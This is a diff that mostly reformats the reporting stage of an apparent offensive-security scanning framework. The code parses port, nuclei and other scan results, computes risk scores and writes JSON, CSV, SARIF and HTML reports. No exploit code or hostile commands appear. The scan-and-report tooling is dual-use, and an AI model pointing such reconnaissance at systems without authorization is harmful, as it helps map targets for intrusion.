+                    "type": "Robots.txt Information Disclosure",
+                    "severity": "low",
+                    "description": "Robots.txt reveals potentially sensitive paths",
+                    "details": disallowed_paths,
+                }
+            )
 
         # Generate recommendations
         if additional_vulns["vulnerabilities"]:
-            additional_vulns["recommendations"].extend([
-                "Review and secure exposed admin panels",
-                "Remove or protect backup files",
-                "Implement proper access controls",
-                "Regular security assessments"
-            ])
+            additional_vulns["recommendations"].extend(
+                [
+                    "Review and secure exposed admin panels",
+                    "Remove or protect backup files",
+                    "Implement proper access controls",
+                    "Regular security assessments",
+                ]
+            )
 
         return atomic_write(out_file, json.dumps(additional_vulns, indent=2))
 
-    safe_execute(
-        _perform_checks,
-        default=False,
-        error_msg="Additional checks failed"
-    )
+    safe_execute(_perform_checks, default=False, error_msg="Additional checks failed")
+
 
 @monitor_performance("report_stage")
 def stage_report(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
@@ -5680,10 +7298,11 @@ def stage_report(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
 
     recon_results: Dict[str, Any] = {}
     vuln_results: Dict[str, Any] = {}
-    
+
     # Try to import enhanced reporting components
     try:
         from enhanced_report_controller import EnhancedReportController
+
         enhanced_reporting_available = True
         logger.log("Enhanced reporting engine loaded successfully", "SUCCESS")
     except ImportError as e:
@@ -5708,25 +7327,31 @@ def stage_report(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
                 "ssl_info": {},
                 "network_info": {},
                 "directories": [],
-                "dns_info": {}
+                "dns_info": {},
             }
 
             # Parse port information
             op = td / "open_ports.txt"
             if op.exists():
-                for line in op.read_text(encoding="utf-8", errors="ignore").splitlines():
+                for line in op.read_text(
+                    encoding="utf-8", errors="ignore"
+                ).splitlines():
                     l = line.strip()
                     if l and ":" in l:
                         try:
                             h, port = l.rsplit(":", 1)
-                            target_data["open_ports"].append({"host": h, "port": int(port), "proto": "tcp"})
+                            target_data["open_ports"].append(
+                                {"host": h, "port": int(port), "proto": "tcp"}
+                            )
                         except Exception as e:
                             logging.warning(f"Operation failed: {e}")
             # Consider if this error should be handled differently
             # Parse HTTP information
             httpx = td / "httpx_output.jsonl"
             if httpx.exists():
-                for line in httpx.read_text(encoding="utf-8", errors="ignore").splitlines():
+                for line in httpx.read_text(
+                    encoding="utf-8", errors="ignore"
+                ).splitlines():
                     try:
                         target_data["http_info"].append(json.loads(line))
                     except Exception as e:
@@ -5736,7 +7361,7 @@ def stage_report(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
             additional_files = {
                 "dns_info.json": "dns_info",
                 "whatweb.json": "technology_stack",
-                "ssl_analysis.json": "ssl_info"
+                "ssl_analysis.json": "ssl_info",
             }
 
             for filename, key in additional_files.items():
@@ -5756,7 +7381,7 @@ def stage_report(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
                         network_info[file.stem] = file.read_text()
                     except Exception as e:
                         logging.warning(f"Operation failed: {e}")
-            # Consider if this error should be handled differently
+                # Consider if this error should be handled differently
                 target_data["network_info"] = network_info
 
             recon_results[tname] = target_data
@@ -5776,27 +7401,43 @@ def stage_report(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
                 "cors_analysis": {},
                 "nikto_results": {},
                 "additional_vulns": {},
-                "risk_score": 0
+                "risk_score": 0,
             }
 
             # Parse Nuclei results
             nuc = td / "nuclei_results.jsonl"
             if nuc.exists():
-                nuclei_lines = nuc.read_text(encoding="utf-8", errors="ignore").splitlines()
+                nuclei_lines = nuc.read_text(
+                    encoding="utf-8", errors="ignore"
+                ).splitlines()
                 vuln_data["nuclei_raw"] = nuclei_lines
 
                 # Parse and categorize nuclei findings
-                parsed_nuclei = {"critical": [], "high": [], "medium": [], "low": [], "info": []}
+                parsed_nuclei = {
+                    "critical": [],
+                    "high": [],
+                    "medium": [],
+                    "low": [],
+                    "info": [],
+                }
                 for line in nuclei_lines:
                     try:
                         finding = json.loads(line)
-                        severity = finding.get("info", {}).get("severity", "unknown").lower()
+                        severity = (
+                            finding.get("info", {}).get("severity", "unknown").lower()
+                        )
                         if severity in parsed_nuclei:
                             parsed_nuclei[severity].append(finding)
-                        vuln_data["risk_score"] += {"critical": 10, "high": 7, "medium": 4, "low": 2, "info": 1}.get(severity, 0)
+                        vuln_data["risk_score"] += {
+                            "critical": 10,
+                            "high": 7,
+                            "medium": 4,
+                            "low": 2,
+                            "info": 1,
+                        }.get(severity, 0)
                     except Exception as e:
                         logging.warning(f"Operation failed: {e}")
-            # Consider if this error should be handled differently
+                # Consider if this error should be handled differently
                 vuln_data["nuclei_parsed"] = parsed_nuclei
 
             # Load additional vulnerability data
@@ -5804,7 +7445,7 @@ def stage_report(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
                 "security_headers.json": "security_headers",
                 "cors_analysis.json": "cors_analysis",
                 "nikto_results.json": "nikto_results",
-                "additional_vulns.json": "additional_vulns"
+                "additional_vulns.json": "additional_vulns",
             }
 
             for filename, key in additional_vuln_files.items():
@@ -5819,37 +7460,45 @@ def stage_report(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
 
     # Get target list for analysis
     targets = read_lines(TARGETS)
-    
+
     # Choose reporting approach based on availability and configuration
-    if enhanced_reporting_available and cfg.get("enhanced_reporting", {}).get("enabled", True):
+    if enhanced_reporting_available and cfg.get("enhanced_reporting", {}).get(
+        "enabled", True
+    ):
         logger.log("Generating report with enhanced intelligent analysis", "INFO")
         try:
             # Create a compatible logger for the enhanced controller
             import logging
-            compatible_logger = logging.getLogger('enhanced_report')
+
+            compatible_logger = logging.getLogger("enhanced_report")
             if not compatible_logger.handlers:
                 compatible_logger.setLevel(logging.INFO)
                 handler = logging.StreamHandler()
-                formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
+                formatter = logging.Formatter(
+                    "%(asctime)s - %(levelname)s - %(message)s"
+                )
                 handler.setFormatter(formatter)
                 compatible_logger.addHandler(handler)
-            
+
             # Initialize enhanced report controller
             enhanced_controller = EnhancedReportController(cfg, compatible_logger)
-            
+
             # Generate enhanced report with intelligent analysis
             enhanced_report_data = enhanced_controller.generate_enhanced_report(
                 run_dir, recon_results, vuln_results, targets
             )
-            
+
             # Save enhanced report
-            atomic_write(report_dir / "enhanced_report.json", json.dumps(enhanced_report_data, indent=2))
+            atomic_write(
+                report_dir / "enhanced_report.json",
+                json.dumps(enhanced_report_data, indent=2),
+            )
             logger.log("Enhanced intelligent report generated successfully", "SUCCESS")
-            
+
             # Generate enhanced HTML report
             generate_enhanced_intelligent_html_report(enhanced_report_data, report_dir)
             logger.log("Enhanced intelligent HTML report generated", "SUCCESS")
-            
+
             # Also generate standard report for compatibility
             overall_risk = calculate_risk_score(vuln_results)
             standard_report_data = {
@@ -5860,45 +7509,61 @@ def stage_report(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
                 "vuln_scan_results": vuln_results,
                 "configuration": cfg,
                 "risk_assessment": overall_risk,
-                "executive_summary": generate_executive_summary(recon_results, vuln_results, overall_risk)
+                "executive_summary": generate_executive_summary(
+                    recon_results, vuln_results, overall_risk
+                ),
             }
-            
+
             # Save both enhanced and standard reports
             formats = cfg.get("report", {}).get("formats", ["html", "json"])
-            
+
             if "json" in formats:
-                atomic_write(report_dir / "report.json", json.dumps(standard_report_data, indent=2))
-                logger.log("Standard JSON report generated for compatibility", "SUCCESS")
-            
+                atomic_write(
+                    report_dir / "report.json",
+                    json.dumps(standard_report_data, indent=2),
+                )
+                logger.log(
+                    "Standard JSON report generated for compatibility", "SUCCESS"
+                )
+
             if "csv" in formats:
                 generate_csv_report(standard_report_data, report_dir)
                 logger.log("CSV report generated", "SUCCESS")
-            
+
             if "sari" in formats:
                 generate_sarif_report(standard_report_data, report_dir)
                 logger.log("SARIF report generated", "SUCCESS")
-            
+
             logger.log(f"Enhanced intelligent report written: {report_dir}", "SUCCESS")
-            
+
         except Exception as e:
             logger.log(f"Enhanced reporting failed: {e}", "ERROR")
             logger.log("Falling back to standard reporting", "WARNING")
             enhanced_reporting_available = False
-    
+
     # Standard reporting fallback
-    if not enhanced_reporting_available or not cfg.get("enhanced_reporting", {}).get("enabled", True):
+    if not enhanced_reporting_available or not cfg.get("enhanced_reporting", {}).get(
+        "enabled", True
+    ):
         logger.log("Generating standard report", "INFO")
-        
+
         # Calculate overall risk assessment
         try:
             overall_risk = calculate_risk_score(vuln_results)
             logger.log("Risk score calculation completed", "DEBUG")
         except Exception as e:
             logger.log(f"Risk calculation failed: {e}", "ERROR")
-            overall_risk = {"total_score": 0, "risk_level": "UNKNOWN", "severity_breakdown": {}, "recommendations": []}
+            overall_risk = {
+                "total_score": 0,
+                "risk_level": "UNKNOWN",
+                "severity_breakdown": {},
+                "recommendations": [],
+            }
 
         try:
-            executive_summary = generate_executive_summary(recon_results, vuln_results, overall_risk)
+            executive_summary = generate_executive_summary(
+                recon_results, vuln_results, overall_risk
+            )
             logger.log("Executive summary generation completed", "DEBUG")
         except Exception as e:
             logger.log(f"Executive summary generation failed: {e}", "ERROR")
@@ -5912,7 +7577,7 @@ def stage_report(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
             "vuln_scan_results": vuln_results,
             "configuration": cfg,
             "risk_assessment": overall_risk,
-            "executive_summary": executive_summary
+            "executive_summary": executive_summary,
         }
 
         # Generate reports in multiple formats
@@ -5936,6 +7601,7 @@ def stage_report(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
 
         logger.log(f"Standard report written: {report_dir}", "SUCCESS")
 
+
 def calculate_risk_score(vuln_results: Dict[str, Any]) -> Dict[str, Any]:
     """Calculate overall risk assessment"""
     total_score = 0
@@ -5943,13 +7609,19 @@ def calculate_risk_score(vuln_results: Dict[str, Any]) -> Dict[str, Any]:
 
     # Safety check: ensure vuln_results is a dictionary
     if not isinstance(vuln_results, dict):
-        logger.log(f"Warning: vuln_results is not a dictionary, got {type(vuln_results)}", "WARNING")
+        logger.log(
+            f"Warning: vuln_results is not a dictionary, got {type(vuln_results)}",
+            "WARNING",
+        )
         vuln_results = {}
 
     for target, data in vuln_results.items():
         # Safety check: ensure data is a dictionary
         if not isinstance(data, dict):
-            logger.log(f"Warning: data for target {target} is not a dictionary, skipping", "WARNING")
+            logger.log(
+                f"Warning: data for target {target} is not a dictionary, skipping",
+                "WARNING",
+            )
             continue
 
         total_score += data.get("risk_score", 0)
@@ -5957,7 +7629,10 @@ def calculate_risk_score(vuln_results: Dict[str, Any]) -> Dict[str, Any]:
 
         # Safety check: ensure nuclei_parsed is a dictionary
         if not isinstance(nuclei_parsed, dict):
-            logger.log(f"Warning: nuclei_parsed for target {target} is not a dictionary, skipping", "DEBUG")
+            logger.log(
+                f"Warning: nuclei_parsed for target {target} is not a dictionary, skipping",
+                "DEBUG",
+            )
             continue
 
         for severity, findings in nuclei_parsed.items():
@@ -5980,58 +7655,85 @@ def calculate_risk_score(vuln_results: Dict[str, Any]) -> Dict[str, Any]:
         "total_score": total_score,
         "risk_level": risk_level,
         "severity_breakdown": severity_counts,
-        "recommendations": generate_risk_recommendations(risk_level, severity_counts)
+        "recommendations": generate_risk_recommendations(risk_level, severity_counts),
     }
 
-def generate_risk_recommendations(risk_level: str, severity_counts: Dict[str, int]) -> List[str]:
+
+def generate_risk_recommendations(
+    risk_level: str, severity_counts: Dict[str, int]
+) -> List[str]:
     """Generate recommendations based on risk level"""
     recommendations = []
 
     if severity_counts["critical"] > 0:
-        recommendations.append("[CRITICAL] IMMEDIATE ACTION REQUIRED: Critical vulnerabilities found")
+        recommendations.append(
+            "[CRITICAL] IMMEDIATE ACTION REQUIRED: Critical vulnerabilities found"
+        )
         recommendations.append("• Patch critical vulnerabilities immediately")
-        recommendations.append("• Consider taking affected systems offline until patched")
+        recommendations.append(
+            "• Consider taking affected systems offline until patched"
+        )
 
     if severity_counts["high"] > 0:
-        recommendations.append("🔴 HIGH PRIORITY: Address high-severity vulnerabilities within 24-48 hours")
+        recommendations.append(
+            "🔴 HIGH PRIORITY: Address high-severity vulnerabilities within 24-48 hours"
+        )
         recommendations.append("• Review and patch high-severity findings")
         recommendations.append("• Implement additional monitoring")
 
     if severity_counts["medium"] > 0:
-        recommendations.append("🟡 MEDIUM PRIORITY: Address medium-severity vulnerabilities within 1-2 weeks")
+        recommendations.append(
+            "🟡 MEDIUM PRIORITY: Address medium-severity vulnerabilities within 1-2 weeks"
+        )
         recommendations.append("• Plan patching for medium-severity issues")
         recommendations.append("• Review configuration hardening")
 
-    recommendations.extend([
-        "• Regular security assessments",
-        "• Implement security headers",
-        "• Review access controls",
-        "• Security awareness training"
-    ])
+    recommendations.extend(
+        [
+            "• Regular security assessments",
+            "• Implement security headers",
+            "• Review access controls",
+            "• Security awareness training",
+        ]
+    )
 
     return recommendations
 
-def generate_executive_summary(recon_results: Dict[str, Any], vuln_results: Dict[str, Any], risk_assessment: Dict[str, Any]) -> Dict[str, Any]:
+
+def generate_executive_summary(
+    recon_results: Dict[str, Any],
+    vuln_results: Dict[str, Any],
+    risk_assessment: Dict[str, Any],
+) -> Dict[str, Any]:
     """Generate executive summary with enhanced safety checks"""
-    
+
     # Safety checks for input parameters
     if not isinstance(recon_results, dict):
-        logger.log(f"Warning: recon_results is not a dictionary, got {type(recon_results)}", "DEBUG")
+        logger.log(
+            f"Warning: recon_results is not a dictionary, got {type(recon_results)}",
+            "DEBUG",
+        )
         recon_results = {}
-    
+
     if not isinstance(vuln_results, dict):
-        logger.log(f"Warning: vuln_results is not a dictionary, got {type(vuln_results)}", "DEBUG")
+        logger.log(
+            f"Warning: vuln_results is not a dictionary, got {type(vuln_results)}",
+            "DEBUG",
+        )
         vuln_results = {}
-    
+
     if not isinstance(risk_assessment, dict):
-        logger.log(f"Warning: risk_assessment is not a dictionary, got {type(risk_assessment)}", "DEBUG")
+        logger.log(
+            f"Warning: risk_assessment is not a dictionary, got {type(risk_assessment)}",
+            "DEBUG",
+        )
         risk_assessment = {"severity_breakdown": {}, "risk_level": "UNKNOWN"}
-    
+
     # Calculate totals with safety checks
     total_subdomains = 0
     total_ports = 0
     total_services = 0
-    
+
     for data in recon_results.values():
         if isinstance(data, dict):
             total_subdomains += len(data.get("subdomains", []))
@@ -6046,8 +7748,9 @@ def generate_executive_summary(recon_results: Dict[str, Any], vuln_results: Dict
         "vulnerabilities_found": risk_assessment.get("severity_breakdown", {}),
         "overall_risk": risk_assessment.get("risk_level", "UNKNOWN"),
         "key_findings": extract_key_findings(vuln_results),
-        "scan_completion": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        "scan_completion": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
     }
+
 
 def extract_key_findings(vuln_results: Dict[str, Any]) -> List[str]:
     """Extract key findings for executive summary"""
@@ -6055,30 +7758,44 @@ def extract_key_findings(vuln_results: Dict[str, Any]) -> List[str]:
 
     # Safety check: ensure vuln_results is a dictionary
     if not isinstance(vuln_results, dict):
-        logger.log(f"Warning: vuln_results is not a dictionary, got {type(vuln_results)}", "DEBUG")
+        logger.log(
+            f"Warning: vuln_results is not a dictionary, got {type(vuln_results)}",
+            "DEBUG",
+        )
         return findings
 
     for target, data in vuln_results.items():
         # Safety check: ensure data is a dictionary
         if not isinstance(data, dict):
-            logger.log(f"Warning: data for target {target} is not a dictionary, skipping", "DEBUG")
+            logger.log(
+                f"Warning: data for target {target} is not a dictionary, skipping",
+                "DEBUG",
+            )
             continue
-            
+
         nuclei_parsed = data.get("nuclei_parsed", {})
-        
+
         # Safety check: ensure nuclei_parsed is a dictionary
         if not isinstance(nuclei_parsed, dict):
-            logger.log(f"Warning: nuclei_parsed for target {target} is not a dictionary, skipping", "DEBUG")
+            logger.log(
+                f"Warning: nuclei_parsed for target {target} is not a dictionary, skipping",
+                "DEBUG",
+            )
             continue
 
         # Safety check: ensure nuclei_parsed is a dictionary
         if not isinstance(nuclei_parsed, dict):
-            logger.log(f"Warning: nuclei_parsed for target {target} is not a dictionary, skipping", "DEBUG")
+            logger.log(
+                f"Warning: nuclei_parsed for target {target} is not a dictionary, skipping",
+                "DEBUG",
+            )
             continue
 
         # Critical findings
         if nuclei_parsed.get("critical"):
-            findings.append(f"[ALERT] {target}: {len(nuclei_parsed['critical'])} critical vulnerabilities")
+            findings.append(
+                f"[ALERT] {target}: {len(nuclei_parsed['critical'])} critical vulnerabilities"
+            )
 
         # Security headers issues
         headers = data.get("security_headers", {})
@@ -6092,72 +7809,92 @@ def extract_key_findings(vuln_results: Dict[str, Any]) -> List[str]:
 
     return findings[:10]  # Limit to top 10 findings
 
+
 def generate_csv_report(report_data: Dict[str, Any], report_dir: Path):
     """Generate CSV format report"""
     import csv
 
     # Vulnerabilities CSV
     vuln_csv = report_dir / "vulnerabilities.csv"
-    with open(vuln_csv, 'w', newline='', encoding='utf-8') as f:
+    with open(vuln_csv, "w", newline="", encoding="utf-8") as f:
         writer = csv.writer(f)
-        writer.writerow(['Target', 'Vulnerability', 'Severity', 'Description', 'Template'])
+        writer.writerow(
+            ["Target", "Vulnerability", "Severity", "Description", "Template"]
+        )
 
         for target, data in report_data["vuln_scan_results"].items():
             # Safety check: ensure data is a dictionary
             if not isinstance(data, dict):
-                logger.log(f"Warning: data for target {target} is not a dictionary, skipping", "DEBUG")
+                logger.log(
+                    f"Warning: data for target {target} is not a dictionary, skipping",
+                    "DEBUG",
+                )
                 continue
-                
+
             nuclei_parsed = data.get("nuclei_parsed", {})
-            
+
             # Safety check: ensure nuclei_parsed is a dictionary
             if not isinstance(nuclei_parsed, dict):
-                logger.log(f"Warning: nuclei_parsed for target {target} is not a dictionary, skipping", "DEBUG")
+                logger.log(
+                    f"Warning: nuclei_parsed for target {target} is not a dictionary, skipping",
+                    "DEBUG",
+                )
                 continue
-                
+
             for severity, findings in nuclei_parsed.items():
                 if not isinstance(findings, (list, tuple)):
                     continue
                 for finding in findings:
                     info = finding.get("info", {})
-                    writer.writerow([
-                        target,
-                        info.get("name", "Unknown"),
-                        severity.upper(),
-                        info.get("description", ""),
-                        finding.get("template-id", "")
-                    ])
+                    writer.writerow(
+                        [
+                            target,
+                            info.get("name", "Unknown"),
+                            severity.upper(),
+                            info.get("description", ""),
+                            finding.get("template-id", ""),
+                        ]
+                    )
+
 
 def generate_sarif_report(report_data: Dict[str, Any], report_dir: Path):
     """Generate SARIF format report for integration with security tools"""
     sarif_data = {
         "version": "2.1.0",
         "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
-        "runs": [{
-            "tool": {
-                "driver": {
-                    "name": "Bl4ckC3ll_PANTHEON",
-                    "version": "9.0.0-enhanced",
-                    "informationUri": "https://github.com/cxb3rf1lth/Bl4ckC3ll_PANTHEON"
-                }
-            },
-            "results": []
-        }]
+        "runs": [
+            {
+                "tool": {
+                    "driver": {
+                        "name": "Bl4ckC3ll_PANTHEON",
+                        "version": "9.0.0-enhanced",
+                        "informationUri": "https://github.com/cxb3rf1lth/Bl4ckC3ll_PANTHEON",
+                    }
+                },
+                "results": [],
+            }
+        ],
     }
 
     for target, data in report_data["vuln_scan_results"].items():
         # Safety check: ensure data is a dictionary
         if not isinstance(data, dict):
-            logger.log(f"Warning: data for target {target} is not a dictionary, skipping", "DEBUG")
+            logger.log(
+                f"Warning: data for target {target} is not a dictionary, skipping",
+                "DEBUG",
+            )
             continue
-            
+
         nuclei_parsed = data.get("nuclei_parsed", {})
-        
+
         # Safety check: ensure nuclei_parsed is a dictionary
         if not isinstance(nuclei_parsed, dict):
-            logger.log(f"Warning: nuclei_parsed for target {target} is not a dictionary, skipping", "DEBUG")
+            logger.log(
+                f"Warning: nuclei_parsed for target {target} is not a dictionary, skipping",
+                "DEBUG",
+            )
             continue
-            
+
         for severity, findings in nuclei_parsed.items():
             if not isinstance(findings, (list, tuple)):
                 continue
@@ -6167,15 +7904,20 @@ def generate_sarif_report(report_data: Dict[str, Any], report_dir: Path):
                     "ruleId": finding.get("template-id", "unknown"),
                     "message": {"text": info.get("description", "No description")},
                     "level": map_severity_to_sarif(severity),
-                    "locations": [{
-                        "physicalLocation": {
-                            "artifactLocation": {"uri": finding.get("matched-at", target)}
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": {
+                                    "uri": finding.get("matched-at", target)
+                                }
+                            }
                         }
-                    }]
+                    ],
                 }
                 sarif_data["runs"][0]["results"].append(result)
 
     atomic_write(report_dir / "report.sari", json.dumps(sarif_data, indent=2))
+
 
 def map_severity_to_sarif(severity: str) -> str:
     """Map our severity levels to SARIF levels"""
@@ -6184,12 +7926,14 @@ def map_severity_to_sarif(severity: str) -> str:
         "high": "error",
         "medium": "warning",
         "low": "note",
-        "info": "note"
+        "info": "note",
     }
     return mapping.get(severity, "note")
 
+
 def generate_enhanced_html_report(report_data: Dict[str, Any], report_dir: Path):
     """Generate enhanced HTML report with improved styling"""
+
     # HTML template with red/yellow color scheme
     def esc(s: str) -> str:
         return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
@@ -6197,8 +7941,17 @@ def generate_enhanced_html_report(report_data: Dict[str, Any], report_dir: Path)
     def html_recon() -> str:
         chunks: List[str] = []
         for target, data in report_data["recon_results"].items():
-            subs = "".join(f"<li>{esc(x)}</li>" for x in data["subdomains"]) or "<li>None</li>"
-            ports = "".join(f"<li><span class='port'>{esc(p['host'])}:{p['port']}/{p['proto']}</span></li>" for p in data["open_ports"]) or "<li>None</li>"
+            subs = (
+                "".join(f"<li>{esc(x)}</li>" for x in data["subdomains"])
+                or "<li>None</li>"
+            )
+            ports = (
+                "".join(
+                    f"<li><span class='port'>{esc(p['host'])}:{p['port']}/{p['proto']}</span></li>"
+                    for p in data["open_ports"]
+                )
+                or "<li>None</li>"
+            )
 
             # Technology stack
             tech_info = ""
@@ -6210,9 +7963,12 @@ def generate_enhanced_html_report(report_data: Dict[str, Any], report_dir: Path)
             if data.get("network_info"):
                 network_info = "<h5>🌐 Network Information</h5>"
                 for key, value in data["network_info"].items():
-                    network_info += f"<h6>{esc(key.title())}</h6><pre>{esc(str(value)[:300])}</pre>"
+                    network_info += (
+                        f"<h6>{esc(key.title())}</h6><pre>{esc(str(value)[:300])}</pre>"
+                    )
 
-            chunks.append("""
+            chunks.append(
+                """
             <div class="target-section">
               <h3>[TARGET] Target: {esc(target)}</h3>
               <div class="info-grid">
@@ -6227,7 +7983,8 @@ def generate_enhanced_html_report(report_data: Dict[str, Any], report_dir: Path)
               </div>
               {tech_info}
               {network_info}
-            </div>""")
+            </div>"""
+            )
         return "\n".join(chunks)
 
     def html_vuln() -> str:
@@ -6235,21 +7992,31 @@ def generate_enhanced_html_report(report_data: Dict[str, Any], report_dir: Path)
         for target, data in report_data["vuln_scan_results"].items():
             # Safety check: ensure data is a dictionary
             if not isinstance(data, dict):
-                logger.log(f"Warning: data for target {target} is not a dictionary, skipping", "DEBUG")
+                logger.log(
+                    f"Warning: data for target {target} is not a dictionary, skipping",
+                    "DEBUG",
+                )
                 continue
-                
+
             nuclei_parsed = data.get("nuclei_parsed", {})
-            
+
             # Safety check: ensure nuclei_parsed is a dictionary
             if not isinstance(nuclei_parsed, dict):
-                logger.log(f"Warning: nuclei_parsed for target {target} is not a dictionary, skipping", "DEBUG")
+                logger.log(
+                    f"Warning: nuclei_parsed for target {target} is not a dictionary, skipping",
+                    "DEBUG",
+                )
                 continue
-                
+
             risk_score = data.get("risk_score", 0)
 
             # Vulnerability summary
             vuln_summary = ""
-            total_vulns = sum(len(findings) for findings in nuclei_parsed.values() if isinstance(findings, (list, tuple)))
+            total_vulns = sum(
+                len(findings)
+                for findings in nuclei_parsed.values()
+                if isinstance(findings, (list, tuple))
+            )
             if total_vulns > 0:
                 vuln_summary = f"""
                 <div class="vuln-summary">
@@ -6274,7 +8041,9 @@ def generate_enhanced_html_report(report_data: Dict[str, Any], report_dir: Path)
                         info = finding.get("info", {})
                         findings_html += f"<li><strong>{esc(info.get('name', 'Unknown'))}</strong>: {esc(info.get('description', 'No description')[:100])}</li>"
                     if len(findings) > 10:
-                        findings_html += f"<li><em>... and {len(findings) - 10} more</em></li>"
+                        findings_html += (
+                            f"<li><em>... and {len(findings) - 10} more</em></li>"
+                        )
                     findings_html += "</ul>"
 
             # Additional security checks
@@ -6291,13 +8060,15 @@ def generate_enhanced_html_report(report_data: Dict[str, Any], report_dir: Path)
                 risk = cors.get("risk_level", "unknown")
                 additional_checks += f"<h5>🌐 CORS Analysis: <span class='risk-{risk}'>{risk.title()}</span></h5>"
 
-            chunks.append("""
+            chunks.append(
+                """
             <div class="target-section">
               <h3>[TARGET] Target: {esc(target)}</h3>
               {vuln_summary}
               {findings_html}
               {additional_checks}
-            </div>""")
+            </div>"""
+            )
         return "\n".join(chunks)
 
     # Executive summary HTML
@@ -6499,12 +8270,18 @@ def generate_enhanced_html_report(report_data: Dict[str, Any], report_dir: Path)
     atomic_write(report_dir / "report.html", html)
     logger.log("Enhanced HTML report with red/yellow theme generated", "SUCCESS")
 
-def generate_enhanced_intelligent_html_report(enhanced_report_data: Dict[str, Any], report_dir: Path):
+
+def generate_enhanced_intelligent_html_report(
+    enhanced_report_data: Dict[str, Any], report_dir: Path
+):
     """Generate enhanced HTML report with intelligent analysis data"""
     try:
+
         def esc(s: str) -> str:
-            return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
-        
+            return (
+                str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+            )
+
         # Extract key data from enhanced report
         metadata = enhanced_report_data.get("report_metadata", {})
         exec_summary = enhanced_report_data.get("executive_summary", {})
@@ -6515,14 +8292,14 @@ def generate_enhanced_intelligent_html_report(enhanced_report_data: Dict[str, An
         technical_analysis = enhanced_report_data.get("technical_analysis", {})
         remediation_roadmap = enhanced_report_data.get("remediation_roadmap", {})
         recommendations = enhanced_report_data.get("recommendations", {})
-        
+
         # Generate executive summary section
         def generate_executive_summary_html() -> str:
             scan_overview = exec_summary.get("scan_overview", {})
             security_posture = exec_summary.get("security_posture", {})
             business_impact = exec_summary.get("business_impact", {})
             key_insights = exec_summary.get("key_insights", [])
-            
+
             html = f"""
             <div class="executive-summary">
                 <h2>🎯 Executive Summary</h2>
@@ -6559,9 +8336,9 @@ def generate_enhanced_intelligent_html_report(enhanced_report_data: Dict[str, An
                     <h3>🔍 Key Intelligence Insights</h3>
                     <ul class="insights-list">
             """
-            
+
             for insight in key_insights[:5]:  # Top 5 insights
-                priority_class = insight.get('priority', 'medium').lower()
+                priority_class = insight.get("priority", "medium").lower()
                 html += f"""
                         <li class="insight insight-{priority_class}">
                             <strong>{esc(insight.get('title', 'Unknown'))}</strong>
@@ -6569,22 +8346,26 @@ def generate_enhanced_intelligent_html_report(enhanced_report_data: Dict[str, An
                             <em>Business Impact: {esc(insight.get('business_implication', ''))}</em>
                         </li>
                 """
-            
+
             html += """
                     </ul>
                 </div>
             </div>
             """
             return html
-        
+
         # Generate threat intelligence section
         def generate_threat_intel_html() -> str:
             if not threat_intel:
                 return "<div class='section'><h3>🛡️ Threat Intelligence</h3><p>No threat intelligence data available</p></div>"
-            
+
             reputation_score = threat_intel.get("reputation_score", 100)
-            reputation_class = "high" if reputation_score >= 80 else "medium" if reputation_score >= 60 else "low"
-            
+            reputation_class = (
+                "high"
+                if reputation_score >= 80
+                else "medium" if reputation_score >= 60 else "low"
+            )
+
             html = f"""
             <div class="section">
                 <h2>🛡️ Threat Intelligence Analysis</h2>
@@ -6608,13 +8389,13 @@ def generate_enhanced_intelligent_html_report(enhanced_report_data: Dict[str, An
             </div>
             """
             return html
-        
+
         # Generate vulnerability analysis section
         def generate_vulnerability_analysis_html() -> str:
             enhanced_vulns = vuln_analysis.get("enhanced_vulnerabilities", [])
             correlations = vuln_analysis.get("correlation_analysis", {})
             attack_surface = vuln_analysis.get("attack_surface_analysis", {})
-            
+
             html = f"""
             <div class="section">
                 <h2>🔍 Advanced Vulnerability Analysis</h2>
@@ -6623,7 +8404,7 @@ def generate_enhanced_intelligent_html_report(enhanced_report_data: Dict[str, An
                     <div class="analysis-box">
                         <h3>📊 Attack Vector Distribution</h3>
             """
-            
+
             # Attack vector distribution from risk assessment
             vector_dist = risk_assessment.get("attack_vector_distribution", {})
             if vector_dist:
@@ -6631,14 +8412,14 @@ def generate_enhanced_intelligent_html_report(enhanced_report_data: Dict[str, An
                     count = data.get("count", 0)
                     percentage = data.get("percentage", 0)
                     html += f"<p><strong>{esc(vector.replace('_', ' ').title())}:</strong> {count} ({percentage}%)</p>"
-            
+
             html += """
                     </div>
                     
                     <div class="analysis-box">
                         <h3>🔗 Attack Chain Analysis</h3>
             """
-            
+
             # Attack chains from correlations
             attack_chains = correlations.get("attack_chains", [])
             if attack_chains:
@@ -6652,7 +8433,7 @@ def generate_enhanced_intelligent_html_report(enhanced_report_data: Dict[str, An
                     """
             else:
                 html += "<p>No significant attack chains identified</p>"
-            
+
             html += """
                     </div>
                 </div>
@@ -6660,7 +8441,7 @@ def generate_enhanced_intelligent_html_report(enhanced_report_data: Dict[str, An
                 <div class="analysis-box">
                     <h3>🎯 Attack Surface Metrics</h3>
             """
-            
+
             surface_metrics = attack_surface.get("surface_metrics", {})
             if surface_metrics:
                 html += f"""
@@ -6679,29 +8460,29 @@ def generate_enhanced_intelligent_html_report(enhanced_report_data: Dict[str, An
                     </div>
                 </div>
                 """
-            
+
             html += """
                 </div>
             </div>
             """
             return html
-        
+
         # Generate executive narrative section
         def generate_narrative_html() -> str:
             storyline = exec_narrative.get("executive_storyline", [])
             key_messages = exec_narrative.get("key_messages", [])
             board_summary = exec_narrative.get("board_summary", {})
-            
+
             if not storyline:
                 return ""
-            
+
             html = """
             <div class="section">
